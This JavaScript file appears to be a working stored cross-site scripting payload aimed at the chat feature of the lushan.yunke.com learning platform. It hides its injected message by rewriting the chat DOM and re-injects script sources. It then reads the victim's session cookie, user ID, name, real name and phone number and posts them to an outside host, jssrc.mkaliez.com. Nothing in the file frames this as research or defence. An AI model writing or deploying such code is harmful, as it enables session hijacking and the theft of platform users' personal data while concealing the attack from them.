/*
    获取个人信息:
        url: https://lushan.yunke.com/site.header.header
        method: GET
        uid: respon.result.userInfo.uid
    登录:
        url: https://lushan.yunke.com/site.main.login
        method: POST
        param:
            areaId	86
            cid	0
            uname	xxx
            areaCode	86
            password	xxx
            submit	登录
        respon:
            Failed: html
            Success: null
*/
var iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.console = iframe.contentWindow.console;

function getCenterStr(oriHTML) { 
    var firstPlace = -1;
    for(var i=0;i<oriHTML.length;i++){
        if(i + 5 >= oriHTML.length) break;
        if(oriHTML[i] == '<' && oriHTML[i+1] == '/' && oriHTML[i+2] == 'l'){
            firstPlace = i + 5;
            break;
        }
    }
    if(firstPlace == -1) return "";
    var res = oriHTML.substr(firstPlace,oriHTML.length-firstPlace);
    res = res.replace(/[\r\n]/g,"");
    res = res.replace("	","");
    return res;
}

function removeHistory(event){
    document.getElementsByTagName('head')[0].removeChild(this);
}

function injectScript(src){
    var newJs = document.createElement('script');
    newJs.type = 'text/javascript';
    newJs.src = src;
    document.getElementsByTagName('head')[0].appendChild(newJs);
    newJs.onload = removeHistory;
}

//修复聊天记录
function FixAndHide(){
    //获取当前正在执行的脚本的地址
    var curScript = "";
    if(document.currentScript != null){
        curScript = document.currentScript.src;
    }
    //修复聊天记录
    var ChatBoxNode = document.getElementById('chatListMain');
    var innerContent = "";
    var scripts = document.getElementsByTagName('script');
    var haveNode = false;
    for(var i=0;i<scripts.length;i++){
        var nowjs = scripts[i];
        //console.log(nowjs.getAttribute('src'));
        if(nowjs.parentNode.classList.contains('chat-content') && (curScript.indexOf(nowjs.getAttribute('src')) > -1)){
            haveNode = true;
            innerContent = getCenterStr(nowjs.innerHTML);
            var MessageNode = nowjs.parentElement.parentElement.parentElement;
            var objE = document.createElement("ul");
            objE.id = "System";
            objE.innerHTML = innerContent;
            document.getElementsByTagName('body')[0].appendChild(objE);
            var tt = document.getElementById('System');
            for(var j=0;j<tt.childNodes.length;j++){
                var curDom = tt.childNodes[j].cloneNode(true);
                ChatBoxNode.insertBefore(curDom,MessageNode);
            }
            document.getElementsByTagName('body')[0].removeChild(tt);
            ChatBoxNode.removeChild(MessageNode);
        }else if(nowjs.parentNode.classList.contains('chat-content')){
            haveNode = true;
            injectScript(nowjs.getAttribute('src'));
            innerContent = getCenterStr(nowjs.innerHTML);
            var MessageNode = nowjs.parentElement.parentElement.parentElement;
            var objE = document.createElement("ul");
            objE.id = "System";
            objE.innerHTML = innerContent;
            document.getElementsByTagName('body')[0].appendChild(objE);
            var tt = document.getElementById('System');
            for(var j=0;j<tt.childNodes.length;j++){
                var curDom = tt.childNodes[j].cloneNode(true);
                ChatBoxNode.insertBefore(curDom,MessageNode);
            }
            document.getElementsByTagName('body')[0].removeChild(tt);
            ChatBoxNode.removeChild(MessageNode);
        }
    }
    return haveNode;
}

while(FixAndHide()){console.log("Success to fix one script!")}

$.get("https://lushan.yunke.com/site.header.header",(res)=>{
    var respon = JSON.parse(res);
    var userid = respon.result.userInfo.uid;
    var userCookie = document.cookie;
    var userName = respon.result.userInfo.name;
    var userRealName = respon.result.userInfo.real_name;
    var userPhone = respon.result.userInfo.mobile;
    var timestamp = Date.parse(new Date());
    $.post("https://jssrc.mkaliez.com/interface.php?timestamp="+timestamp,{
        userid : userid,
        usercookie : userCookie,
        username : userName,
        userrealname : userRealName,
        userphone : userPhone
    },(res)=>{
        console.log(res);
    })
})
